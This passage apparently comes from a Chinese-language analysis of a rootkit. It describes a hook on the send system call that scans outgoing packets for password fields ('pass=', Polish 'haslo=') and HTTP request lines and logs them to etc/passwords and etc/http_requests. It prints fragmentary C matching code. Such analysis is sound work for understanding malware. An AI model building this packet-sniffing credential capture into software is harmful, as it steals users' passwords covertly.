## **功能7 监视网络发送**
监视网络发送 hook send系统调用




如果packet的长度为0或者没有成功执行拷贝操作则goto end。

否则，接下来

`password_found()`检查数据包内容是否包含密码

```
        return 1;
if (strnstr(buf, "pass=", size))
        return 1;
if (strnstr(buf, "haslo=", size)) //password in polish
        return 1;
    return 0;

```   

`http_header_found()`

```
 if (strnstr(buf, "POST /", size))
        return 1;
    if (strnstr(buf, "GET /", size))
        return 1;
    return 0;
```
    
如果包含密码或者http头，都将内容通过 `save_to_log()`保存至etc的相应文件etc/passwords和etc/http_requests。
